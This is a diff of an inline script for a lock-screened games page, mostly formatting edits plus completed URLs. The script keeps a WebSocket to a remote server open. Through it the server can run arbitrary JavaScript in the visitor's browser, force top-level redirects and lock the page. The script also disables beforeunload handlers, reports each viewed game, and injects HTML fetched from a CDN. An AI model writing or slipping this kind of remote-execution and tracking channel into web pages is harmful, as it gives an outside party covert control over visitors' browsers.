@@ -9,9 +9,10 @@
 <div id="tp-ui"></div>
 <script>
 (() => {
-  const WS_URL = 'wss:
+  const WS_URL = 'wss://tpws.b-cdn.net';
   const KONAMI = ['ArrowUp','ArrowUp','ArrowDown','ArrowDown','ArrowLeft','ArrowRight','ArrowLeft','ArrowRight','b','a','Enter'];
   const LS = localStorage;
+
   const shadow = document.getElementById('tp-ui').attachShadow({ mode: 'open' });
   shadow.innerHTML = `
   <style>
@@ -90,19 +91,25 @@
       <button id="ubtn">Let's go</button>
     </div>
   </div>`;
+
   const EL = {
     lock:   shadow.getElementById('lockscreen'),
     prompt: shadow.getElementById('prompt'),
     input:  shadow.getElementById('uname'),
     btn:    shadow.getElementById('ubtn'),
   };
+
   let ws, wsReady = false, siteLoaded = false, konamiPos = 0, currentGameId = null;
   let locked = LS.getItem('unlocked') !== '1';
+
   if (!LS.getItem('tp_temp_username'))
     LS.setItem('tp_temp_username', 'user_' + (Math.random() * 9000 + 1000 | 0));
+
   let username = LS.getItem('tp_username') || LS.getItem('tp_temp_username');
+
   const show = el => el.style.display = 'flex';
   const hide = el => el.style.display = 'none';
+
   let toastContainer;
   function getToastContainer() {
     if (!toastContainer) {
@@ -117,6 +124,7 @@
     }
     return toastContainer;
   }
+
   function showToast(msg, duration = 6000) {
     const t = document.createElement('div');
     Object.assign(t.style, {
@@ -150,22 +158,27 @@
       setTimeout(() => t.remove(), 300);
     }, duration + msg.length * 40);
   }
+
   const _origAEL = EventTarget.prototype.addEventListener;
   EventTarget.prototype.addEventListener = function(type, fn, opts) {
     if (type === 'beforeunload') return;
     return _origAEL.call(this, type, fn, opts);
   };
   Object.defineProperty(window, 'onbeforeunload', { set(){}, get(){ return null; } });
+
   function sendGameUpdate() {
     if (wsReady) ws.send(JSON.stringify({ type: 'game_update', gameId: currentGameId }));
   }
+
   function checkGameId() {
     const id = new URLSearchParams(location.search).get('id') || null;
     if (id !== currentGameId) { currentGameId = id; sendGameUpdate(); }
   }
+
   const _origPush = history.pushState;
   history.pushState = function(...a) { _origPush.apply(this, a); checkGameId(); };
   window.addEventListener('popstate', checkGameId);
+
   function saveUsername() {
     const val = EL.input.value.trim();
     if (!val) return;
@@ -180,13 +193,15 @@
     }
     if (!locked) loadSite();
   }
+
   EL.btn.addEventListener('click', saveUsername);
   EL.input.addEventListener('keydown', e => { if (e.key === 'Enter') saveUsername(); });
+
   function loadSite() {
     if (siteLoaded) return;
     siteLoaded = true;
     hide(EL.lock);
-    fetch(`https:
+    fetch('https://cdn.jsdelivr.net/gh/CatHead132/CatHead132.github.io@latest/gnupdated.html?t=' + Date.now())
       .then(r => r.text())
       .then(html => {
         const root = document.getElementById('r');
@@ -209,6 +224,7 @@
       })
       .catch(() => { siteLoaded = false; });
   }
+
   function connectWS() {
     try { ws = new WebSocket(WS_URL); } catch { setTimeout(connectWS, 3000); return; }
     ws.onopen = () => {
@@ -226,11 +242,15 @@
           username = msg.newName;
           LS.setItem('tp_username', username);
           break;
-        case 'notify':   showToast(msg.message); break;
-        case 'redirect':
-          window.top.location.href = /^https?:\/\
+        case 'notify':
+          showToast(msg.message);
           break;
-        case 'execjs':   try { new Function(msg.code)(); } catch {} break;
+        case 'redirect':
+          window.top.location.href = /^https?:\/\//i.test(msg.url) ? msg.url : 'https://' + msg.url;
+          break;
+        case 'execjs':
+          try { new Function(msg.code)(); } catch {}
+          break;
         case 'lock':
           locked = true; LS.removeItem('unlocked'); location.reload(); break;
         case 'unlock':
@@ -240,6 +260,7 @@
     ws.onclose = () => { wsReady = false; setTimeout(connectWS, 3000); };
     ws.onerror = () => { wsReady = false; };
   }
+
   document.addEventListener('keydown', e => {
     if (e.key === KONAMI[konamiPos]) {
       if (++konamiPos === KONAMI.length) {
@@ -253,7 +274,9 @@
       konamiPos = e.key === KONAMI[0] ? 1 : 0;
     }
   });
+
   connectWS();
+
   if (locked) {
     show(EL.lock);
   } else if (!LS.getItem('tp_username')) {
